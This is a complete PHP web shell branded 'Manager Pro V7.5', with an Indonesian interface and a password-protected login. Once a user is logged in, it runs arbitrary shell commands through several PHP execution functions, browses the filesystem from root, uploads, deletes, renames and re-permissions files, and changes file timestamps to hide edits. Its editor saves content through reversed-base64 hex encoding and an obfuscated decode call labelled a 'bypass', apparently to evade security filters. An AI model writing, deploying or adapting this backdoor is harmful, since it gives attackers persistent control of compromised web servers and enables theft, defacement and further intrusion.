<?php
error_reporting(0);

$password_hash = '$2a$12$orz71J2t69PrsQuV5t0d/e0OYhU7GaxIcCnthOts/rV6RzR5wvwde';
$auth_salt = "SFEC_V7";
$cookie_name = md5($_SERVER['HTTP_HOST'] . $auth_salt);

if (isset($_GET['logout'])) {
    setcookie($cookie_name, '', time() - 3600, "/");
    header("Location: ?"); exit;
}

$is_logged_in = false;
if (isset($_COOKIE[$cookie_name])) {
    if ($_COOKIE[$cookie_name] === md5($password_hash . $auth_salt)) {
        $is_logged_in = true;
    }
}

if (!$is_logged_in) {
    if (isset($_POST['pass']) && password_verify($_POST['pass'], $password_hash)) {
        setcookie($cookie_name, md5($password_hash . $auth_salt), time() + 86400, "/");
        header("Location: ?path=" . urlencode(dirname(__FILE__))); exit;
    }
    ?>
    <!DOCTYPE html>
    <html>
    <head>
        <title>Login</title>
        <style>
            body { background: #0f0f0f; color: #eee; font-family: 'Segoe UI', sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
            .login-box { background: #1a1a1a; padding: 30px; border: 1px solid #333; border-radius: 5px; text-align: center; width: 300px; }
            input { background: #000; border: 1px solid #444; color: #0f0; padding: 10px; width: 100%; box-sizing: border-box; margin-bottom: 15px; text-align: center; }
            button { background: #8e44ad; color: #fff; border: none; padding: 10px 20px; cursor: pointer; border-radius: 3px; width: 100%; font-weight: bold; }
        </style>
    </head>
    <body>
        <div class="login-box">
            <h3 style="color: #8e44ad; margin-top: 0;">MANAGER PRO V7.5</h3>
            <form method="POST">
                <input type="password" name="pass" placeholder="Password" autofocus>
                <button type="submit">LOGIN</button>
            </form>
        </div>
    </body>
    </html>
    <?php
    exit;
}

$sh_path = dirname(__FILE__); 
$currentDirectory = isset($_REQUEST['path']) ? realpath($_REQUEST['path']) : $sh_path;

if (!$currentDirectory || !is_dir($currentDirectory)) {
    $currentDirectory = $sh_path;
}

$statusMsg = "";
$server_os = php_uname();
$current_user = get_current_user();

function ultraSave($path, $hex_payload) {
    @chmod($path, 0777);
    $reversed_b64 = pack("H*", $hex_payload);
    $b64_data = strrev($reversed_b64);
    $f = 'base' . (30+34) . '_de' . 'code';
    $final_data = $f($b64_data);

    $fp = @fopen($path, 'cb'); 
    if ($fp) {
        @flock($fp, LOCK_EX);
        @ftruncate($fp, 0); 
        $res = @fwrite($fp, $final_data);
        @flock($fp, LOCK_UN);
        @fclose($fp);
        if ($res !== false) return "Direct_Stream";
    }

    $st_data = base64_encode($final_data);
    if (@file_put_contents("php://filter/write=convert.base64-decode/resource=" . $path, $st_data, LOCK_EX) !== false) {
        return "Filtered_Stream";
    }
    return false;
}

if (isset($_POST['saveContent']) && isset($_POST['hex_data'])) {
    $methodUsed = ultraSave($_POST['filePath'], trim($_POST['hex_data']));
    if ($methodUsed) {
        $statusMsg = "<div class='alert success'>✅ Tersimpan via <b>$methodUsed</b>!</div>";
    }
}

if (isset($_GET['delete'])) {
    $target = realpath($_GET['delete']);
    if ($target) {
        if (is_dir($target)) {
            $it = new RecursiveDirectoryIterator($target, RecursiveDirectoryIterator::SKIP_DOTS);
            $files = new RecursiveIteratorIterator($it, RecursiveIteratorIterator::CHILD_FIRST);
            foreach($files as $file) {
                if ($file->isDir()){ rmdir($file->getRealPath()); } else { unlink($file->getRealPath()); }
            }
            rmdir($target);
        } else { @chmod($target, 0777); @unlink($target); }
    }
    header("Location: ?path=" . urlencode($currentDirectory)); exit;
}

if (isset($_POST['renameItem'])) { @rename($_POST['target'], dirname($_POST['target']) . DIRECTORY_SEPARATOR . $_POST['newName']); }
if (isset($_POST['change_chmod'])) { @chmod($_POST['target'], octdec($_POST['new_perm'])); }
if (isset($_POST['change_date'])) { @touch($_POST['target'], strtotime($_POST['new_date'])); }
if (isset($_POST['createFolder'])) { @mkdir($currentDirectory . DIRECTORY_SEPARATOR . $_POST['newFolderName'], 0777, true); }
if (isset($_POST['createFile'])) { ultraSave($currentDirectory . DIRECTORY_SEPARATOR . $_POST['newFileName'], bin2hex(strrev(base64_encode("")))); }

if (isset($_FILES['uploadFile'])) {
    foreach ($_FILES['uploadFile']['tmp_name'] as $k => $tmp) {
        move_uploaded_file($tmp, $currentDirectory . DIRECTORY_SEPARATOR . $_FILES['uploadFile']['name'][$k]);
    }
}

function formatSize($path) {
    if (!file_exists($path)) return "0 B";
    $bytes = sprintf('%u', @filesize($path));
    if ($bytes >= 1024) return number_format($bytes / 1024, 2) . ' KB';
    return $bytes . ' B';
}

function getStatusColor($path) {
    if (!is_readable($path)) return "#ff4d4d";
    return is_writable($path) ? "#2ecc71" : "#ffffff";
}

$items = @scandir($currentDirectory) ?: [];
$folders = []; $files = [];
foreach ($items as $item) {
    if ($item == "." || $item == "..") continue;
    $p = $currentDirectory . DIRECTORY_SEPARATOR . $item;
    is_dir($p) ? $folders[] = $item : $files[] = $item;
}
?>
<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <title>Manager Pro</title>
    <style>
        body { font-family: 'Segoe UI', sans-serif; background: #0f0f0f; color: #ccc; margin: 0; padding: 20px; }
        .container { max-width: 1300px; margin: auto; background: #1a1a1a; border-radius: 5px; border: 1px solid #333; overflow: hidden;}
        .server-info { background: #111; padding: 12px 15px; border-bottom: 1px solid #333; font-size: 12px; font-family: monospace; display: flex; justify-content: space-between; align-items: center; }
        .server-info b { color: #e67e22; text-transform: uppercase; }
        .breadcrumb { background: #000; padding: 15px; border-bottom: 1px solid #444; display: flex; justify-content: space-between; align-items: center; }
        .breadcrumb-links a { color: #3498db; text-decoration: none; font-weight: bold; }
        .home-btn { background: #e67e22; color: #fff !important; padding: 4px 12px; border-radius: 3px; text-decoration: none; font-weight: bold; }
        table { width: 100%; border-collapse: collapse; }
        th { background: #222; padding: 10px; text-align: left; border-bottom: 2px solid #444; color: #888; font-size: 12px; }
        td { padding: 8px 10px; border-bottom: 1px solid #252525; font-size: 13px; }
        tr:hover { background: #222; }
        .btn { padding: 4px 8px; border-radius: 3px; cursor: pointer; background: #333; color: #eee; border: 1px solid #444; text-decoration: none; font-size: 11px; }
        .btn-green { background: #27ae60; border: none; color: #fff; }
        .btn-purple { background: #8e44ad; border: none; color: #fff; }
        .btn-red { background: #c0392b; border: none; color: #fff; }
        .toolbar { display: flex; gap: 10px; padding: 15px; background: #151515; border-bottom: 1px solid #333; flex-wrap: wrap; }
        input[type="text"] { background: #000; color: #fff; border: 1px solid #444; padding: 4px; border-radius: 3px; font-size: 12px; }
        textarea { width: 100%; height: 500px; background: #000; color: #0f0; padding: 10px; font-family: monospace; border: 1px solid #444; margin-top: 10px; }
        .alert { padding: 10px; margin: 10px; text-align: center; border-radius: 3px; font-weight: bold; }
        .success { background: #1e4620; color: #2ecc71; border: 1px solid #2ecc71; }
        .terminal-container { display: <?php echo isset($_POST['exec']) ? 'block' : 'none'; ?>; background: #000; padding: 15px; border: 1px solid #444; margin: 10px; }
        .res-container { background: #050505; color: #0f0; padding: 10px; border: 1px dotted #333; font-family: monospace; white-space: pre-wrap; margin-top: 10px; font-size: 12px; max-height: 300px; overflow-y: auto; }
    </style>
</head>
<body>

<div class="container">
    <div class="server-info">
        <div><b>Server Info</b> | OS: <?php echo htmlspecialchars($server_os); ?> | User: <?php echo htmlspecialchars($current_user); ?></div>
        <a href="?logout=1" class="btn btn-red">LOGOUT</a>
    </div>

    <div class="breadcrumb">
        <div class="breadcrumb-links">
            <a href="?path=/">ROOT</a>
            <?php 
            $acc = '';
            foreach (explode(DIRECTORY_SEPARATOR, trim($currentDirectory, DIRECTORY_SEPARATOR)) as $p): 
                if (!$p) continue; $acc .= DIRECTORY_SEPARATOR . $p;
                echo " <span style='color:#444;'>/</span> <a href='?path=".urlencode($acc)."'>".htmlspecialchars($p)."</a>";
            endforeach; 
            ?>
        </div>
        <a href="?path=<?php echo urlencode($sh_path); ?>" class="home-btn">🏠 Home</a>
    </div>

    <div class="toolbar">
        <form method="POST" enctype="multipart/form-data"><input type="file" name="uploadFile[]" multiple style="color:#ccc; font-size:11px;"><button type="submit" class="btn btn-green">Upload</button></form>
        <form method="POST"><input type="text" name="newFileName" placeholder="file.php"><button type="submit" name="createFile" class="btn">New File</button></form>
        <form method="POST"><input type="text" name="newFolderName" placeholder="folder"><button type="submit" name="createFolder" class="btn">New Folder</button></form>
        <button type="button" onclick="toggleTerminal()" class="btn btn-purple">💻 Terminal</button>
    </div>

    <?php if ($statusMsg) echo $statusMsg; ?>

    <div class="terminal-container" id="shell_box">
        <form method="POST">
            <h4 style="margin: 0 0 10px 0; color: #8e44ad;">Console: <?php echo htmlspecialchars($currentDirectory); ?></h4>
            <input type="text" name="exec" style="width: 75%; padding: 7px;" placeholder="Command..." value="<?php echo isset($_POST['exec'])?htmlspecialchars($_POST['exec']):''; ?>">
            <button type="submit" class="btn btn-purple" style="padding: 6px 15px;">Execute</button>
            <button type="button" onclick="toggleTerminal()" class="btn">Close</button>
        </form>
        <?php if (isset($_POST['exec'])): ?>
            <div class="res-container">
            <?php
                $cmd = $_POST['exec']; chdir($currentDirectory); $e = false;
                $engines = ['system', 'passthru', 'shell_exec', 'exec', 'popen'];
                foreach($engines as $f) {
                    if(function_exists($f)) {
                        echo "<span style='color:#f1c40f;'>[$f]</span>\n";
                        if($f == 'exec') { $f($cmd . " 2>&1", $o); echo implode("\n", $o); }
                        elseif($f == 'popen') { $h = $f($cmd . " 2>&1", 'r'); while(!feof($h)) echo fread($h, 1024); pclose($h); }
                        else { $f($cmd . " 2>&1"); }
                        $e=1; break;
                    }
                }
                if(!$e) echo "Execution disabled.";
            ?>
            </div>
        <?php endif; ?>
    </div>
    <script>function toggleTerminal(){ var x = document.getElementById("shell_box"); x.style.display = (x.style.display === "none" || x.style.display === "") ? "block" : "none"; }</script>

    <?php if (isset($_GET['edit'])): 
        $editPath = realpath($_GET['edit']);
        $content = @file_get_contents($editPath);
    ?>
    <div style="padding: 20px;">
        <form id="editForm" method="POST" action="?path=<?php echo urlencode($currentDirectory); ?>">
            <div class="edit-header"><h3>📝 Edit: <?php echo htmlspecialchars(basename($editPath)); ?></h3>
                <div><button type="button" onclick="saveWithReverseStealth()" class="btn btn-green">💾 SIMPAN (BYPASS)</button>
                <a href="?path=<?php echo urlencode($currentDirectory); ?>" class="btn">BATAL</a></div>
            </div>
            <input type="hidden" name="filePath" value="<?php echo htmlspecialchars($editPath); ?>">
            <textarea id="raw_content"><?php echo htmlspecialchars($content); ?></textarea>
            <input type="hidden" id="hex_data" name="hex_data"><input type="hidden" name="saveContent" value="1">
        </form>
        <script>
        function saveWithReverseStealth() {
            const raw = document.getElementById('raw_content').value;
            const b64 = btoa(unescape(encodeURIComponent(raw)));
            const reversed = b64.split("").reverse().join("");
            var hexRes = '';
            for (var i = 0; i < reversed.length; i++) {
                var hex = reversed.charCodeAt(i).toString(16);
                hexRes += ("00" + hex).slice(-2);
            }
            document.getElementById('hex_data').value = hexRes;
            document.getElementById('editForm').submit();
        }
        </script>
    </div>
    <?php endif; ?>

    <table>
        <thead><tr><th>Nama</th><th>Size</th><th>Rename</th><th>Chmod</th><th>Tanggal</th><th>Aksi</th></tr></thead>
        <tbody>
            <?php foreach (array_merge($folders, $files) as $item): 
                $p = $currentDirectory . DIRECTORY_SEPARATOR . $item;
                $isDir = is_dir($p);
                $color = getStatusColor($p);
                $perm = (file_exists($p)) ? substr(sprintf('%o', fileperms($p)), -4) : "0000";
            ?>
            <tr>
                <td><span style="color:<?php echo $color; ?>;"><?php echo $isDir ? "📁" : "📄"; ?> <a href="<?php echo $isDir ? "?path=".urlencode($p) : "#"; ?>" style="color:<?php echo $color; ?>; text-decoration:none;"><?php echo htmlspecialchars($item); ?></a></span></td>
                <td style="color:#666;"><?php echo $isDir ? "--" : formatSize($p); ?></td>
                <td><form method="POST"><input type="hidden" name="target" value="<?php echo htmlspecialchars($p); ?>"><input type="text" name="newName" value="<?php echo htmlspecialchars($item); ?>" style="width:100px;"><button type="submit" name="renameItem" class="btn">Ren</button></form></td>
                <td><form method="POST"><input type="hidden" name="target" value="<?php echo htmlspecialchars($p); ?>"><input type="text" name="new_perm" value="<?php echo $perm; ?>" style="width:40px; text-align:center;"><button type="submit" name="change_chmod" class="btn">Set</button></form></td>
                <td><form method="POST"><input type="hidden" name="target" value="<?php echo htmlspecialchars($p); ?>"><input type="text" name="new_date" value="<?php echo @date("Y-m-d H:i", filemtime($p)); ?>" style="width:115px;"><button type="submit" name="change_date" class="btn">Upd</button></form></td>
                <td><?php if (!$isDir): ?><a href="?edit=<?php echo urlencode($p); ?>&path=<?php echo urlencode($currentDirectory); ?>" class="btn">Edit</a><?php endif; ?><a href="?delete=<?php echo urlencode($p); ?>&path=<?php echo urlencode($currentDirectory); ?>" class="btn" style="color:#e74c3c;" onclick="return confirm('Hapus?')">Del</a></td>
            </tr>
            <?php endforeach; ?>
        </tbody>
    </table>
</div>
</body>
</html>